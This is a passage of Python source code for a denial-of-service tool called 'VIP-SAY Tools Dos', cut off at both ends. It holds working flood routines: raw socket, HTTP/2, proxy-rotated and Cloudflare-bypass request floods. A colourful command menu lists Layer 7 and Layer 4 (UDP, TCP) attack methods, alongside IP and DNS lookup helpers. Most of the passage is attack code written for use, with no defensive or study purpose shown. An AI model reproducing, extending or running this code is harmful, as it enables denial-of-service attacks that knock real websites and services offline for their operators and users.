              s.connect((str(target['host']), int(target['port'])))
      except:
          return
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              try:
                  for _ in range(100):
                      s.send(str.encode(req))
              except:
                  s.close()
          except:
              pass

  
  def LaunchCFB(url, th, t):
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      scraper = cloudscraper.create_scraper()
      for _ in range(int(th)):
          try:
              thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
              thd.start()
          except:
              pass

  def AttackCFB(url, until_datetime, scraper):
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              scraper.get(url, timeout=15)
              scraper.get(url, timeout=15)
          except:
              pass
  

  
  def LaunchPXCFB(url, th, t):
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      scraper = cloudscraper.create_scraper()
      for _ in range(int(th)):
          try:
              thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
              thd.start()
          except:
              pass

  def AttackPXCFB(url, until_datetime, scraper):
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              proxy = {
                      'http': 'http://'+str(random.choice(list(proxies))),   
                      'https': 'http://'+str(random.choice(list(proxies))),
              }
              scraper.get(url, proxies=proxy)
              scraper.get(url, proxies=proxy)
          except:
              pass
  

  
  def LaunchCFPRO(url, th, t):
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      session = requests.Session()
      scraper = cloudscraper.create_scraper(sess=session)
      jar = RequestsCookieJar()
      jar.set(cookieJAR['name'], cookieJAR['value'])
      scraper.cookies = jar
      for _ in range(int(th)):
          try:
              thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
              thd.start()
          except:
              pass

  def AttackCFPRO(url, until_datetime, scraper):
      headers = {
          'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
          'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
          'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache',
          'Connection': 'keep-alive',
          'Upgrade-Insecure-Requests': '1',
          'Sec-Fetch-Dest': 'document',
          'Sec-Fetch-Mode': 'navigate',
          'Sec-Fetch-Site': 'same-origin',
          'Sec-Fetch-User': '?1',
          'TE': 'trailers',
      }
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              scraper.get(url=url, headers=headers, allow_redirects=False)
              scraper.get(url=url, headers=headers, allow_redirects=False)
          except:
              pass
  

  
  def LaunchCFSOC(url, th, t):
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      target = get_target(url)
      req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
      req += 'Host: ' + target['host'] + '\r\n'
      req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
      req += 'Accept-Encoding: gzip, deflate, br\r\n'
      req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
      req += 'Cache-Control: max-age=0\r\n'
      req += 'Cookie: ' + cookie + '\r\n'
      req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
      req += 'sec-ch-ua-mobile: ?0\r\n'
      req += 'sec-ch-ua-platform: "Windows"\r\n'
      req += 'sec-fetch-dest: empty\r\n'
      req += 'sec-fetch-mode: cors\r\n'
      req += 'sec-fetch-site: same-origin\r\n'
      req += 'Connection: Keep-Alive\r\n'
      req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
      for _ in range(int(th)):
          try:
              thd = threading.Thread(target=AttackCFSOC,args=(until, target, req,))
              thd.start()
          except:  
              pass

  def AttackCFSOC(until_datetime, target, req):
      if target['scheme'] == 'https':
          packet = socks.socksocket()
          packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
          packet.connect((str(target['host']), int(target['port'])))
          packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
      else:
          packet = socks.socksocket()
          packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
          packet.connect((str(target['host']), int(target['port'])))
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              for _ in range(10):
                  packet.send(str.encode(req))
          except:
              packet.close()
              pass
  

  def attackSKY(url, timer, threads):
      for i in range(int(threads)):
          threading.Thread(target=LaunchSKY, args=(url, timer)).start()

  def LaunchSKY(url, timer):
      proxy = random.choice(proxies).strip().split(":")
      timelol = time.time() + int(timer)
      req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
      req += "Cache-Control: no-cache\r\n"
      req += "User-Agent: " + random.choice(log) + "\r\n"
      req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
      req += "Sec-Fetch-Site: same-origin\r\n"
      req += "Sec-GPC: 1\r\n"
      req += "Sec-Fetch-Mode: navigate\r\n"
      req += "Sec-Fetch-Dest: document\r\n"
      req += "Upgrade-Insecure-Requests: 1\r\n"
      req += "Connection: Keep-Alive\r\n\r\n"
      while time.time() < timelol:
          try:
              s = socks.socksocket()
              s.connect((str(urlparse(url).netloc), int(443)))
              s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
              ctx = ssl.SSLContext()
              s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
              s.send(str.encode(req))
              try:
                  for _ in range(100):
                      s.send(str.encode(req))
                      s.send(str.encode(req))
              except:
                  s.close()
          except:
              s.close()

  def attackSTELLAR(url, timer, threads):
      for i in range(int(threads)):
          threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

  def LaunchSTELLAR(url, timer):
      timelol = time.time() + int(timer)
      req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
      req += "Cache-Control: no-cache\r\n"
      req += "User-Agent: " + random.choice(log) + "\r\n"
      req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
      req += "Sec-Fetch-Site: same-origin\r\n"
      req += "Sec-GPC: 1\r\n"
      req += "Sec-Fetch-Mode: navigate\r\n"
      req += "Sec-Fetch-Dest: document\r\n"
      req += "Upgrade-Insecure-Requests: 1\r\n"
      req += "Connection: Keep-Alive\r\n\r\n"
      while time.time() < timelol:
          try:
              s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              s.connect((str(urlparse(url).netloc), int(443)))
              ctx = ssl.create_default_context()
              s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
              s.send(str.encode(req))
              try:
                  for _ in range(100):
                      s.send(str.encode(req))
                      s.send(str.encode(req))
              except:
                  s.close()
          except:
              s.close()
  

  def LaunchHTTP2(url, th, t):
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      for _ in range(int(th)):
          threading.Thread(target=AttackHTTP2, args=(url, until)).start()

  def AttackHTTP2(url, until_datetime):
      headers = {
              'User-Agent': random.choice(log),
              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
              'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
              'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
              'Cache-Control': 'no-cache',
              'Pragma': 'no-cache',
              'Connection': 'keep-alive',
              'Upgrade-Insecure-Requests': '1',
              'Sec-Fetch-Dest': 'document',
              'Sec-Fetch-Mode': 'navigate',
              'Sec-Fetch-Site': 'same-origin',
              'Sec-Fetch-User': '?1',
              'TE': 'trailers',
              }
      client = httpx.Client(http2=True)
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              client.get(url, headers=headers)
              client.get(url, headers=headers)
          except:
              pass

  def LaunchPXHTTP2(url, th, t):
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      for _ in range(int(th)):
          threading.Thread(target=AttackHTTP2, args=(url, until)).start()

  def AttackPXHTTP2(url, until_datetime):
      headers = {
              'User-Agent': random.choice(log),
              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
              'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
              'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
              'Cache-Control': 'no-cache',
              'Pragma': 'no-cache',
              'Connection': 'keep-alive',
              'Upgrade-Insecure-Requests': '1',
              'Sec-Fetch-Dest': 'document',
              'Sec-Fetch-Mode': 'navigate',
              'Sec-Fetch-Site': 'same-origin',
              'Sec-Fetch-User': '?1',
              'TE': 'trailers',
              }

      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              client = httpx.Client(
                  http2=True,
                  proxies={
                      'http://': 'http://'+random.choice(proxies),
                      'https://': 'http://'+random.choice(proxies),
                  }
               )
              client.get(url, headers=headers)
              client.get(url, headers=headers)
          except:
              pass

  def test1(url, th, t):
      until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
      target = get_target(url)
      req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
      req += 'Host: ' + target['host'] + '\r\n'
      req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
      req += 'Accept-Encoding: gzip, deflate, br\r\n'
      req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
      req += 'Cache-Control: max-age=0\r\n'
      #req += 'Cookie: ' + cookie + '\r\n'
      req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
      req += 'sec-ch-ua-mobile: ?0\r\n'
      req += 'sec-ch-ua-platform: "Windows"\r\n'
      req += 'sec-fetch-dest: empty\r\n'
      req += 'sec-fetch-mode: cors\r\n'
      req += 'sec-fetch-site: same-origin\r\n'
      req += 'Connection: Keep-Alive\r\n'
      req += 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en\r\n\r\n\r\n'
      for _ in range(int(th)):
          try:
              thd = threading.Thread(target=test2,args=(until, target, req,))
              thd.start()
          except:  
              pass

  def test2(until_datetime, target, req):
      if target['scheme'] == 'https':
          packet = socks.socksocket()
          packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
          packet.connect((str(target['host']), int(target['port'])))
          packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
      else:
          packet = socks.socksocket()
          packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
          packet.connect((str(target['host']), int(target['port'])))
      while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
          try:
              for _ in range(10):
                  packet.send(str.encode(req))
          except:
              packet.close()
              pass


  

  def clear(): 
      if name == 'nt': 
          system('cls')
      else: 
          system('clear')
  ##############################################################################################
  def help():
      clear()
      stdout.write("                                                                                         \n")
      stdout.write("                              "+Fore.RED+"╔═╗╔═╗╔╦╗╔╦╗╔═╗╔╗╔╔╦╗╔═╗\n")
      stdout.write("                              "+Fore.RED+"║  ║ ║║║║║║║╠═╣║║║ ║║╚═╗\n")
      stdout.write("                              "+Fore.RED+"╚═╝╚═╝╩ ╩╩ ╩╩ ╩╝╚╝═╩╝╚═╝\n")
      stdout.write("             "+Fore.RED+"               ╚════╦════════════════╦════╝\n")
      stdout.write("             "+Fore.RED+"         ╚══╦═══════╩════════════════╩═══════╦══╝\n")
      stdout.write("                         "+Fore.RED+"║ "+Fore.MAGENTA+"♥ "+Fore.WHITE+"Layer4 "+Fore.LIGHTCYAN_EX+"|  "+Fore.WHITE+"SHOWS THE COMMANDS "+Fore.RED+"║\n")
      stdout.write("                         "+Fore.RED+"║ "+Fore.MAGENTA+"♥ "+Fore.WHITE+"Layer7 "+Fore.LIGHTCYAN_EX+"|  "+Fore.WHITE+"SHOWS THE COMMANDS "+Fore.RED+"║\n")
      stdout.write("                         "+Fore.RED+"║ "+Fore.MAGENTA+"♥ "+Fore.WHITE+"Tools "+Fore.LIGHTCYAN_EX+" |  "+Fore.WHITE+"SHOWS THE TOOLS "+Fore.RED+"   ║\n")
      stdout.write("                         "+Fore.RED+"║ "+Fore.MAGENTA+"♥ "+Fore.WHITE+"Credit"+Fore.LIGHTCYAN_EX+" |  "+Fore.WHITE+"SHOW THE DEV "+Fore.RED+"      ║\n")
      stdout.write("                         "+Fore.RED+"║ "+Fore.MAGENTA+"♥ "+Fore.WHITE+"exit"+Fore.LIGHTCYAN_EX+"   |  "+Fore.WHITE+"EXIT THE TOOL "+Fore.RED+"     ║\n")
      stdout.write("                         "+Fore.RED+"╚════════════════════════════════╝         \n")
      stdout.write("\n")
  ##############################################################################################
  def credit():
      clear()
      stdout.write(""+Fore.RED+" ██████╗██████╗ ███████╗██████╗ ██╗████████╗\n")
      stdout.write(""+Fore.RED+"██╔════╝██╔══██╗██╔════╝██╔══██╗██║╚══██╔══╝\n")
      stdout.write(""+Fore.RED+"██║     ██████╔╝█████╗  ██║  ██║██║   ██║   \n")
      stdout.write(""+Fore.RED+"██║     ██╔══██╗██╔══╝  ██║  ██║██║   ██║   \n")
      stdout.write(""+Fore.RED+"╚██████╗██║  ██║███████╗██████╔╝██║   ██║   \n")
      stdout.write(""+Fore.RED+" ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝   ╚═╝   \n")
      stdout.write(""+Fore.RED+"╔═════════════════════════════╗\n")
      stdout.write(" "+Fore.LIGHTWHITE_EX+"Aziz.\n")
      stdout.write(""+Fore.RED+"╚═════════════════════════════╝\n")
      stdout.write("\n")    
  ##############################################################################################
  def layer7():
      clear()
      stdout.write("                                                                                         \n")
      stdout.write("                                 "+Fore.RED+"╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗\n")
      stdout.write("                                 "+Fore.RED+"║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝\n")
      stdout.write("                                 "+Fore.RED+"╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩\n")
      stdout.write("            "+Fore.RED+" ╚══════╦═══════════════════════════════════════════╦══════╝\n")
      stdout.write("              "+Fore.RED+" ╚═╦══╩═══════════════════════════════════════════╩══╦═╝\n")
      stdout.write("        "+Fore.RED+"         ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"SOC "+Fore.LIGHTCYAN_EX+"    | "+Fore.WHITE+"SOCKET ATTACK "+Fore.RED+"                     ║\n")
      stdout.write("        "+Fore.RED+"         ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"PXRAW "+Fore.LIGHTCYAN_EX+"  | "+Fore.WHITE+"PROXY REQUEST ATTACK "+Fore.RED+"              ║\n") 
      stdout.write("        "+Fore.RED+"         ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"PXSOC "+Fore.LIGHTCYAN_EX+"  | "+Fore.WHITE+"PROXY SOCKET ATTACK "+Fore.RED+"               ║\n") 
      stdout.write("        "+Fore.RED+"         ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"PXSPOOF "+Fore.LIGHTCYAN_EX+"| "+Fore.WHITE+"HTTP SPOOF ATTACK PROXY "+Fore.RED+"           ║\n") 
      stdout.write("        "+Fore.RED+"         ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"SPOOF "+Fore.LIGHTCYAN_EX+"  | "+Fore.WHITE+"HTTP SPOOF ATTACK "+Fore.RED+"                 ║\n") 
      stdout.write("        "+Fore.RED+"         ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"HTTP2 "+Fore.LIGHTCYAN_EX+"  | "+Fore.WHITE+"HTTP 2.0 ATTACK "+Fore.RED+"                   ║\n") 
      stdout.write("        "+Fore.RED+"         ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"PXHTTP2 "+Fore.LIGHTCYAN_EX+"| "+Fore.WHITE+"HTPP 2.0 ATTACK PROXY "+Fore.RED+"             ║\n") 
      stdout.write("        "+Fore.RED+"         ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"GET "+Fore.LIGHTCYAN_EX+"    | "+Fore.WHITE+"GET REQUEST ATTACK "+Fore.RED+"                ║\n") 
      stdout.write("        "+Fore.RED+"         ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"POST "+Fore.LIGHTCYAN_EX+"   | "+Fore.WHITE+"POST REQUEST ATTACK "+Fore.RED+"               ║\n") 
      stdout.write("        "+Fore.RED+"         ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"CFREQ "+Fore.LIGHTCYAN_EX+"  | "+Fore.WHITE+"BYPASS CF UAM, CAPTCHA, BFM "+Fore.RED+"       ║\n") 
      stdout.write("        "+Fore.RED+"         ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"PXCFB "+Fore.LIGHTCYAN_EX+"  | "+Fore.WHITE+"BYPASS CF ATTACK WITH PROXY "+Fore.RED+"       ║\n") 
      stdout.write("        "+Fore.RED+"         ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"SKY "+Fore.LIGHTCYAN_EX+"    | "+Fore.WHITE+"SKY METHOD WITH PROXY "+Fore.RED+"             ║\n") 
      stdout.write("        "+Fore.RED+"         ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"CFB "+Fore.LIGHTCYAN_EX+"    | "+Fore.WHITE+"BYPASS CF ATTACK "+Fore.RED+"                  ║\n") 
      stdout.write("        "+Fore.RED+"         ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"CFSOC "+Fore.LIGHTCYAN_EX+"  | "+Fore.WHITE+"BYPASS CF UAM, CAPTCHA, BFM "+Fore.RED+"       ║\n") 
      stdout.write("        "+Fore.RED+"         ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"PXSKY "+Fore.LIGHTCYAN_EX+"  | "+Fore.WHITE+"BYPASS GOOGLE "+Fore.RED+"                     ║\n") 
      stdout.write("        "+Fore.RED+"         ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"HEAD "+Fore.LIGHTCYAN_EX+"   | "+Fore.WHITE+"HEAD REQUEST ATTACK "+Fore.RED+"               ║\n") 
      stdout.write("        "+Fore.RED+"         ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"PPS "+Fore.LIGHTCYAN_EX+"    | "+Fore.WHITE+"ONLY GET/HTTP/1.1 "+Fore.RED+"                 ║\n")
      stdout.write("        "+Fore.RED+"         ╚═════════════════════════════════════════════════╝\n") 
      stdout.write("\n")

  def layer4():
      clear()
      stdout.write("                               "+Fore.RED+"╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦\n")
      stdout.write("                               "+Fore.RED+"║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣\n")
      stdout.write("                               "+Fore.RED+"╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩\n")
      stdout.write("              "+Fore.RED+"         ╚══════╦═══════════════════╦══════╝\n")
      stdout.write("              "+Fore.RED+"           ╚═╦══╩═══════════════════╩══╦═╝\n")
      stdout.write("             "+Fore.RED+"              ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"UDP "+Fore.LIGHTCYAN_EX+" | "+Fore.WHITE+" udp Attack "+Fore.RED+"  ║\n")
      stdout.write("             "+Fore.RED+"              ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"TCP "+Fore.LIGHTCYAN_EX+" | "+Fore.WHITE+" tcp Attack "+Fore.RED+"  ║\n")
      stdout.write("             "+Fore.RED+"              ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"LDAP "+Fore.LIGHTCYAN_EX+"| "+Fore.WHITE+" Coming Soon "+Fore.RED+" ║\n")
      stdout.write("             "+Fore.RED+"              ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"DNS "+Fore.LIGHTCYAN_EX+" | "+Fore.WHITE+" Coming Soon "+Fore.RED+" ║\n")
      stdout.write("             "+Fore.RED+"              ║ "+Fore.YELLOW+"*! "+Fore.WHITE+"SNMP "+Fore.LIGHTCYAN_EX+"| "+Fore.WHITE+" Coming Soon "+Fore.RED+" ║\n")
      stdout.write("             "+Fore.RED+"              ╚═════════════════════════╝\n")
      stdout.write("\n")

  def tools():
      clear()
      stdout.write("                                                                                         \n")
      stdout.write("                                 "+Fore.RED+"╔╦╗╔═╗╔═╗╦  ╔═╗             \n")
      stdout.write("                                 "+Fore.RED+" ║ ║ ║║ ║║  ╚═╗             \n")
      stdout.write("                                 "+Fore.RED+" ╩ ╚═╝╚═╝╩═╝╚═╝             \n")
      stdout.write("             "+Fore.RED+"            ══╦═════════════════════════╦══\n")
      stdout.write("             "+Fore.RED+"        ╔═════╩═════════════════════════╩═════╗\n")
      stdout.write("             "+Fore.RED+"          \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"geoip "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" IP LOOKUP\n")
      stdout.write("             "+Fore.RED+"          \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"dns   "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" DNS LOOKUP   \n")
      stdout.write("             "+Fore.RED+"          \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"subnet"+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" SUBNET IP LOOKUP   \n")
      stdout.write("             "+Fore.RED+"          \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"ping"+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" PING IP   \n")
      stdout.write("             "+Fore.RED+"        ╚═════════════════════════════════════╝\n") 
      stdout.write("\n")
  ##############################################################################################
  def title():
      stdout.write("                                                                                          \n")
      stdout.write("                                "+Fore.RED+"  ╔╦╗╔╦╗╔═╗╔═╗                 \n")
      stdout.write("                                "+Fore.RED+"   ║║ ║║║ ║╚═╗             \n")
      stdout.write("                                "+Fore.RED+"  ═╩╝═╩╝╚═╝╚═╝            \n")
      stdout.write("             "+Fore.RED+"            ╚═══╦═══════════════════╦═══╝\n")
      stdout.write("             "+Fore.RED+"       ╚╦═══════╩═══════════════════╩═══════╦╝\n")
      stdout.write("             "+Fore.RED+"        ║ "+Fore.LIGHTCYAN_EX+" Welcome "+Fore.LIGHTWHITE_EX+"To The "+Fore.RED+"VIP-SAY"+Fore.LIGHTWHITE_EX+" Tools Dos "+Fore.RED+"  ║                  \n")
      stdout.write("             "+Fore.RED+"        ║ "+Fore.BLUE+"  https://discord.gg/cqShgnqy5T"+Fore.RED+"  ║                \n")
      stdout.write("             "+Fore.RED+"        ║  "+Fore.WHITE+" Type "+Fore.LIGHTGREEN_EX+"[help]"+Fore.WHITE+" View The Commands "+Fore.RED+"  ║                     \n")
      stdout.write("             "+Fore.RED+"        ╚═══════════════════════════════════╝         \n")
      stdout.write("\n")
  ##############################################################################################
  def command():
      stdout.write(Fore.BLUE+"╔═══"+Fore.BLUE+"["+Fore.MAGENTA+"VIP"+Fore.BLUE+"●"+Fore.RED+"SAY"+Fore.BLUE+"]"+Fore.BLUE+"\n╚══"+Fore.BLUE+"> "+Fore.WHITE)
      command = input()
      if command == "cls" or command == "clear":
          clear()
          title()
      elif command == "help" or command == "?":
          help()
      elif command == "credit":
          credit()        
      elif command == "layer7" or command == "LAYER7" or command == "l7" or command == "L7" or command == "Layer7":
          layer7()
      elif command == "layer4" or command == "LAYER4" or command == "l4" or command == "L4" or command == "Layer4":
          layer4()
      elif command == "tools" or command == "tool":
          tools()
      elif command == "exit":
          exit() 
      elif command == "test":
          target, thread, t = get_info_l7()
          test1(target, thread, t)
          time.sleep(10)
      elif command == "http2" or command == "HTTP2":
          target, thread, t = get_info_l7()
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          LaunchHTTP2(target, thread, t)
          timer.join()
      elif command == "pxhttp2" or command == "PXHTTP2":
          if get_proxies():
              target, thread, t = get_info_l7()
              timer = threading.Thread(target=countdown, args=(t,))
              timer.start()
              LaunchPXHTTP2(target, thread, t)
              timer.join()
      elif command == "cfb" or command == "CFB":
          target, thread, t = get_info_l7()
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          LaunchCFB(target, thread, t)
          timer.join()
      elif command == "pxcfb" or command == "PXCFB":
          if get_proxies():
              target, thread, t = get_info_l7()
              timer = threading.Thread(target=countdown, args=(t,))
              timer.start()
              LaunchPXCFB(target, thread, t)
              timer.join()
      elif command == "pps" or command == "PPS":
          target, thread, t = get_info_l7()
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          LaunchPPS(target, thread, t)
          timer.join() 
      elif command == "spoof" or command == "SPOOF":
          target, thread, t = get_info_l7()
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          LaunchSPOOF(target, thread, t)
          timer.join() 
      elif command == "pxspoof" or command == "PXSPOOF":
          target, thread, t = get_info_l7()
          #timer = threading.Thread(target=countdown, args=(t,))
          #timer.start()
          LaunchPXSPOOF(target, thread, t, get_proxylist("SOCKS5"))
          #timer.join()
          time.sleep(1000)
      elif command == "get" or command == "GET":
          target, thread, t = get_info_l7()
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          LaunchRAW(target, thread, t)
          timer.join()
      elif command == "post" or command == "POST":
          target, thread, t = get_info_l7()
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          LaunchPOST(target, thread, t)
          timer.join()
      elif command == "head" or command == "HEAD":
          target, thread, t = get_info_l7()
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          LaunchHEAD(target, thread, t)
          timer.join()
      elif command == "pxraw" or command == "PXRAW":
          if get_proxies():
              target, thread, t = get_info_l7()
              timer = threading.Thread(target=countdown, args=(t,))
              timer.start()
              LaunchPXRAW(target, thread, t)
              timer.join()
      elif command == "soc" or command == "SOC":
          target, thread, t = get_info_l7()
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          LaunchSOC(target, thread, t)
          timer.join()
      elif command == "pxsoc" or command == "PXSOC":
          if get_proxies():
              target, thread, t = get_info_l7()
              timer = threading.Thread(target=countdown, args=(t,))
              timer.start()
              LaunchPXSOC(target, thread, t)
              timer.join()
      elif command == "cfreq" or command == "CFREQ":
          target, thread, t = get_info_l7()
          stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
          if get_cookie(target):
              timer = threading.Thread(target=countdown, args=(t,))
              timer.start()
              LaunchCFPRO(target, thread, t)
              timer.join()
          else:
              stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
      elif command == "cfsoc" or command == "CFSOC":
          target, thread, t = get_info_l7()
          stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
          if get_cookie(target):
              timer = threading.Thread(target=countdown, args=(t,))
              timer.start()
              LaunchCFSOC(target, thread, t)
              timer.join()
          else:
              stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
      elif command == "pxsky" or command == "PXSKY":
          if get_proxies():
              target, thread, t = get_info_l7()
              threading.Thread(target=attackSKY, args=(target, t, thread)).start()
              timer = threading.Thread(target=countdown, args=(t,))
              timer.start()
              timer.join()
      elif command == "sky" or command == "SKY":
          target, thread, t = get_info_l7()
          threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          timer.join()
      elif command == "udp" or command == "UDP":
          target, port, thread, t = get_info_l4()
          threading.Thread(target=runsender, args=(target, port, t, thread)).start()
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          timer.join()
      elif command == "tcp" or command == "TCP":
          target, port, thread, t = get_info_l4()
          threading.Thread(target=runflooder, args=(target, port, t, thread)).start()
          timer = threading.Thread(target=countdown, args=(t,))
          timer.start()
          timer.join()


  ##############################################################################################     
      elif command == "subnet":
          stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
          target = input()
          try:
              r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
              print(r.text)
          except:
              print('An error has occurred while sending the request to the API!')                   

      elif command == "dns":
          stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP/DOMAIN "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
          target = input()
          try:
              r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
              print(r.text)
          except:
              print('An error has occurred while sending the request to the API!')

      elif command == "geoip":
          stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
          target = input()
          try:
              r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}")
              print(r.text)
          except:
              print('An error has occurred while sending the request to the API!')
      elif command == "ping":
          stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
          try:
              import os
              from os import system
              system("title " + "Ip Pinger,  ")
          except:
              pass
          
          print("""
